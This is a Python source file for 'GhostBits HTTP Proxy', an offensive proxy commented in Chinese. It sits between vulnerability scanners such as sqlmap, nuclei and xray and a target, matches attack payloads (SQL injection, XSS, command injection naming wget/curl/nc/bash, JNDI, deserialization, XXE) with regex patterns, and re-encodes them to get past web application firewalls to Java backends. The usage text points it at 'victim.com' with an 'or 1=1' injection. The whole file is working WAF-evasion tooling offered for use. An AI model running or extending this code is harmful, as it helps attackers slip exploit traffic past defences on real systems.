#!/usr/bin/env python3
"""
GhostBits HTTP Proxy — 扫描器流量自动编码代理

将扫描器（nuclei/xray/sqlmap/burp 等）的 HTTP 流量中的攻击载荷
自动进行 Ghost Bits 编码，穿透 WAF 到达 Java 后端。

用法：
    # 启动代理（默认监听 127.0.0.1:8888）
    python3 proxy.py

    # 指定端口和字符集
    python3 proxy.py -p 9999 -c cjk

    # nuclei 使用代理
    nuclei -t templates/ -proxy http://127.0.0.1:8888 -target http://victim.com

    # xray 使用代理
    xray webscan --proxy http://127.0.0.1:8888 --url http://victim.com

    # sqlmap 使用代理
    sqlmap -u "http://victim.com/id=1" --proxy=http://127.0.0.1:8888

    # 仅编码模式（不编码结构字符）
    python3 proxy.py --mode selective

    # 全编码模式（除分隔符外全部编码）
    python3 proxy.py --mode aggressive
"""

import sys
import os
import re
import socket
import ssl
import threading
import argparse
import time
import urllib.parse
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from engine import GhostBitsEngine, OutputFormatter


# ============================================================
# 编码策略
# ============================================================

class EncodingStrategy:
    """Ghost Bits 编码策略"""

    # URL 结构字符 - 永远不编码
    URL_STRUCT_CHARS = "/?&=#"

    # JSON 结构字符 - 永远不编码
    JSON_STRUCT_CHARS = '{}[]":,.'

    # HTTP 头部中不应编码的字符
    HEADER_SAFE_CHARS = " :;,./=-_"

    # 攻击特征关键字（用于 selective 模式识别 payload）
    ATTACK_PATTERNS = [
        # SQL Injection
        re.compile(r"(?i)(union\s+select|or\s+\d+=\d+|and\s+\d+=\d+|select\s+.*from|"
                   r"insert\s+into|update\s+.*set|delete\s+from|drop\s+table|"
                   r"exec\s*\(|xp_cmdshell|benchmark\s*\(|sleep\s*\(|waitfor\s+delay)"),
        # Path Traversal
        re.compile(r"(\.\./|\.\.\\|%2e%2e|%252e)"),
        # XSS
        re.compile(r"(?i)(<script|javascript:|on\w+\s*=|<img\s|<svg\s|<iframe)"),
        # Command Injection
        re.compile(r"(;\s*(cat|ls|id|whoami|wget|curl|ping|nc|bash)|"
                   r"\|\s*(cat|ls|id|whoami)|`[^`]+`)"),
        # Java Deserialization
        re.compile(r"(?i)(@type|java\.lang\.|javax\.|com\.sun\.|org\.apache\.|"
                   r"Runtime\.getRuntime|ProcessBuilder|ClassLoader|"
                   r"BCEL\$|ysoserial|JdbcRowSet)"),
        # SSTI/EL Injection
        re.compile(r"(\$\{|#\{|\{\{|T\(java\.)"),
        # LDAP/JNDI
        re.compile(r"(?i)(ldap://|rmi://|jndi:|dns://)"),
        # XXE
        re.compile(r"(?i)(<!ENTITY|<!DOCTYPE|SYSTEM\s+[\"']|file://)"),
    ]

    def __init__(self, engine: GhostBitsEngine, mode: str = "selective"):
        """
        Args:
            engine: Ghost Bits 编码引擎
            mode: 编码模式
                - selective: 只编码匹配攻击特征的部分
                - aggressive: 对所有非结构字符编码
                - full: 全部编码（包括结构字符，慎用）
        """
        self.engine = engine
        self.mode = mode

    def should_encode(self, text: str) -> bool:
        """判断文本是否包含需要编码的攻击特征"""
        if self.mode == "aggressive" or self.mode == "full":
            return True
        # selective 模式：只有匹配攻击特征才编码
        for pattern in self.ATTACK_PATTERNS:
            if pattern.search(text):
                return True
        return False

    def encode_url_path(self, path: str) -> str:
        """编码 URL 路径"""
        if not self.should_encode(path):
            return path

        # 整体匹配到攻击特征，对非结构字符做编码
        encoded = self.engine.encode(path, exempt="/.-_~")
        return OutputFormatter.percent_encode(encoded)

    def encode_query_string(self, query: str) -> str:
        """编码 URL 查询参数"""
        if not query:
            return query

        params = urllib.parse.parse_qs(query, keep_blank_values=True)
        encoded_parts = []

        for key, values in params.items():
            for value in values:
                if self.should_encode(value) or self.mode == "aggressive":
                    encoded_val = self.engine.encode(value, exempt=self.URL_STRUCT_CHARS)
                    formatted = OutputFormatter.percent_encode(encoded_val)
                    encoded_parts.append(f"{key}={formatted}")
                else:
                    encoded_parts.append(f"{key}={urllib.parse.quote(value, safe='')}")

        return "&".join(encoded_parts)

    def encode_body(self, body: bytes, content_type: str = "") -> bytes:
        """编码请求体"""
        try:
            text = body.decode("utf-8")
        except UnicodeDecodeError:
            return body  # 二进制内容不处理

        if not self.should_encode(text):
            return body

        if "json" in content_type.lower():
            return self._encode_json_body(text).encode("utf-8")
        elif "x-www-form-urlencoded" in content_type.lower():
            return self._encode_form_body(text).encode("utf-8")
        else:
            # 通用文本编码
            encoded = self.engine.encode(text, exempt=self.URL_STRUCT_CHARS + self.JSON_STRUCT_CHARS)
            return OutputFormatter.percent_encode(encoded).encode("utf-8")

    def _encode_json_body(self, text: str) -> str:
        """编码 JSON body - 保留 JSON 结构，编码值"""
        # 对 JSON 字符串值中的攻击载荷做 \uXXXX 编码
        # 简单策略：对非结构字符做编码
        encoded = self.engine.encode(text, exempt=self.JSON_STRUCT_CHARS + " ")
        return OutputFormatter.unicode_escape(encoded)

    def _encode_form_body(self, text: str) -> str:
        """编码 form-urlencoded body"""
        params = urllib.parse.parse_qs(text, keep_blank_values=True)
        encoded_parts = []

        for key, values in params.items():
            for value in values:
                if self.should_encode(value) or self.mode == "aggressive":
                    encoded_val = self.engine.encode(value, exempt="")
                    formatted = OutputFormatter.percent_encode(encoded_val)
                    encoded_parts.append(f"{key}={formatted}")
                else:
                    encoded_parts.append(f"{key}={urllib.parse.quote(value, safe='')}")

        return "&".join(encoded_parts)


# ============================================================
# HTTP 代理服务器
# ============================================================

class GhostBitsProxyHandler(BaseHTTPRequestHandler):
    """Ghost Bits 编码代理请求处理器"""

    # 类级别共享
    encoding_strategy = None
    verbose = False

    def do_GET(self):
        self._handle_request("GET")

    def do_POST(self):
        self._handle_request("POST")

    def do_PUT(self):
        self._handle_request("PUT")

    def do_DELETE(self):
        self._handle_request("DELETE")

    def do_PATCH(self):
        self._handle_request("PATCH")

    def do_OPTIONS(self):
        self._handle_request("OPTIONS")

    def do_HEAD(self):
        self._handle_request("HEAD")

    def do_CONNECT(self):
        """处理 HTTPS CONNECT 隧道（直接透传，不编码）"""
        # 对于 HTTPS，我们只做透传隧道
        # Ghost Bits 编码主要针对 HTTP 明文流量
        host_port = self.path.split(":")
        host = host_port[0]
        port = int(host_port[1]) if len(host_port) > 1 else 443

        try:
            remote_sock = socket.create_connection((host, port), timeout=10)
            self.send_response(200, "Connection Established")
            self.end_headers()

            # 双向透传
            self._tunnel(self.connection, remote_sock)
        except Exception as e:
            self.send_error(502, f"Bad Gateway: {e}")

    def _tunnel(self, client_sock, remote_sock):
        """HTTPS 隧道双向透传"""
        client_sock.setblocking(False)
        remote_sock.setblocking(False)

        sockets = [client_sock, remote_sock]
        timeout = 60

        import select
        while True:
            readable, _, exceptional = select.select(sockets, [], sockets, timeout)

            if exceptional:
                break

            if not readable:
                break

            for sock in readable:
                try:
                    data = sock.recv(65536)
                    if not data:
                        return
                    if sock is client_sock:
                        remote_sock.sendall(data)
                    else:
                        client_sock.sendall(data)
                except (ConnectionResetError, BrokenPipeError, OSError):
                    return

        client_sock.close()
        remote_sock.close()

    def _handle_request(self, method: str):
        """处理 HTTP 请求并进行 Ghost Bits 编码"""
        # 解析目标 URL
        parsed = urllib.parse.urlparse(self.path)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 80)

        if not host:
            # 非代理请求格式，尝试从 Host 头获取
            host_header = self.headers.get("Host", "")
            if ":" in host_header:
                host, port = host_header.rsplit(":", 1)
                port = int(port)
            else:
                host = host_header
                port = 80

        # 读取请求体
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length) if content_length > 0 else b""

        # Ghost Bits 编码
        encoded_path = self._encode_request_path(parsed.path)
        encoded_query = self._encode_request_query(parsed.query)
        content_type = self.headers.get("Content-Type", "")
        encoded_body = self.encoding_strategy.encode_body(body, content_type) if body else b""

        # 构建编码后的请求路径
        new_path = encoded_path
        if encoded_query:
            new_path += "?" + encoded_query

        # 日志
        if self.verbose:
            original_path = parsed.path + ("?" + parsed.query if parsed.query else "")
            if new_path != original_path:
                self._log(f"[ENCODE] {method} {original_path[:80]}")
                self._log(f"      → {new_path[:80]}")

        # 转发请求
        try:
            self._forward_request(method, host, port, new_path, encoded_body,
                                  parsed.scheme == "https")
        except Exception as e:
            self.send_error(502, f"Bad Gateway: {e}")

    def _encode_request_path(self, path: str) -> str:
        """编码请求路径"""
        return self.encoding_strategy.encode_url_path(path)

    def _encode_request_query(self, query: str) -> str:
        """编码查询参数"""
        return self.encoding_strategy.encode_query_string(query)

    def _forward_request(self, method: str, host: str, port: int,
                         path: str, body: bytes, use_ssl: bool):
        """转发编码后的请求到目标服务器"""
        # 建立连接
        sock = socket.create_connection((host, port), timeout=30)
        if use_ssl:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=host)

        # 构建 HTTP 请求
        request_line = f"{method} {path} HTTP/1.1\r\n"
        headers = f"Host: {host}\r\n"

        # 复制原始头部（跳过代理相关头）
        skip_headers = {"host", "proxy-connection", "proxy-authorization",
                        "connection", "content-length"}
        for key, value in self.headers.items():
            if key.lower() not in skip_headers:
                headers += f"{key}: {value}\r\n"

        # 更新 Content-Length
        if body:
            headers += f"Content-Length: {len(body)}\r\n"

        headers += "Connection: close\r\n"
        headers += "\r\n"

        # 发送
        sock.sendall((request_line + headers).encode("utf-8", errors="replace"))
        if body:
            sock.sendall(body)

        # 读取响应
        response = b""
        while True:
            try:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break

        sock.close()

        # 解析响应状态行
        if response:
            # 找到 header/body 分界
            header_end = response.find(b"\r\n\r\n")
            if header_end == -1:
                header_end = response.find(b"\n\n")
                sep_len = 2
            else:
                sep_len = 4

            if header_end != -1:
                resp_headers = response[:header_end].decode("utf-8", errors="replace")
                resp_body = response[header_end + sep_len:]

                # 解析状态行
                lines = resp_headers.split("\r\n" if "\r\n" in resp_headers else "\n")
                status_line = lines[0]
                parts = status_line.split(" ", 2)
                if len(parts) >= 2:
                    status_code = int(parts[1])
                    reason = parts[2] if len(parts) > 2 else ""
                    self.send_response(status_code, reason)
                else:
                    self.send_response(502)

                # 转发响应头
                skip_resp_headers = {"transfer-encoding", "connection"}
                for line in lines[1:]:
                    if ": " in line:
                        key, value = line.split(": ", 1)
                        if key.lower() not in skip_resp_headers:
                            self.send_header(key, value)

                self.send_header("Content-Length", str(len(resp_body)))
                self.end_headers()
                self.wfile.write(resp_body)
            else:
                # 无法解析，原样返回
                self.send_response(502)
                self.end_headers()
                self.wfile.write(response)
        else:
            self.send_response(502)
            self.end_headers()

    def _log(self, msg: str):
        """日志输出"""
        print(f"  {msg}", file=sys.stderr)

    def log_message(self, format, *args):
        """覆盖默认日志格式"""
        if self.verbose:
            sys.stderr.write(f"[{time.strftime('%H:%M:%S')}] {format % args}\n")


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """多线程 HTTP 服务器"""
    daemon_threads = True
    allow_reuse_address = True


# ============================================================
# 入口
# ============================================================

def main():
    parser = argparse.ArgumentParser(
        prog="ghostbits-proxy",
        description="GhostBits HTTP Proxy — 扫描器流量自动 Ghost Bits 编码",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
使用示例:
  # 启动代理
  python3 proxy.py -p 8888 -c gb2312 --mode selective

  # nuclei 使用
  nuclei -proxy http://127.0.0.1:8888 -t templates/ -u http://target.com

  # xray 使用
  xray webscan --proxy http://127.0.0.1:8888 --url http://target.com

  # sqlmap 使用
  sqlmap -u "http://target.com/?id=1" --proxy=http://127.0.0.1:8888

  # curl 测试
  curl -x http://127.0.0.1:8888 "http://target.com/?id=1 or 1=1"

编码模式:
  selective   只编码匹配攻击特征的参数（默认，低误报）
  aggressive  对所有参数值编码（高覆盖，可能影响正常功能）
  full        全部编码包括结构字符（极端模式，仅用于特殊场景）
""",
    )

    parser.add_argument("-p", "--port", type=int, default=8888,
                        help="代理监听端口 (默认: 8888)")
    parser.add_argument("-b", "--bind", default="127.0.0.1",
                        help="绑定地址 (默认: 127.0.0.1)")
    parser.add_argument("-c", "--charset", default="gb2312",
                        choices=["gb2312", "cjk", "latin", "random", "private"],
                        help="伪装字符集 (默认: gb2312)")
    parser.add_argument("--mode", default="selective",
                        choices=["selective", "aggressive", "full"],
                        help="编码模式 (默认: selective)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="详细日志输出")
    parser.add_argument("--seed", type=int, help="随机种子")

    args = parser.parse_args()

    # 初始化引擎和策略
    engine = GhostBitsEngine(charset=args.charset, seed=args.seed)
    strategy = EncodingStrategy(engine, mode=args.mode)

    # 配置 Handler
    GhostBitsProxyHandler.encoding_strategy = strategy
    GhostBitsProxyHandler.verbose = args.verbose

    # 启动服务器
    server = ThreadedHTTPServer((args.bind, args.port), GhostBitsProxyHandler)

    print(f"""
╔══════════════════════════════════════════════════════════╗
║         GhostBits HTTP Proxy — 东方隐侠安全团队          ║
╠══════════════════════════════════════════════════════════╣
║  Listen:   {args.bind}:{args.port:<43}║
║  Charset:  {args.charset:<47}║
║  Mode:     {args.mode:<47}║
║  Verbose:  {str(args.verbose):<47}║
╠══════════════════════════════════════════════════════════╣
║  Usage:                                                  ║
║    nuclei -proxy http://{args.bind}:{args.port} ...{' ' * (22 - len(str(args.port)))}║
║    sqlmap --proxy=http://{args.bind}:{args.port} ...{' ' * (21 - len(str(args.port)))}║
║    curl -x http://{args.bind}:{args.port} <url>{' ' * (27 - len(str(args.port)))}║
╠══════════════════════════════════════════════════════════╣
║  Ctrl+C to stop                                          ║
╚══════════════════════════════════════════════════════════╝
""", file=sys.stderr)

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Proxy stopped.", file=sys.stderr)
        server.shutdown()


if __name__ == "__main__":
    main()
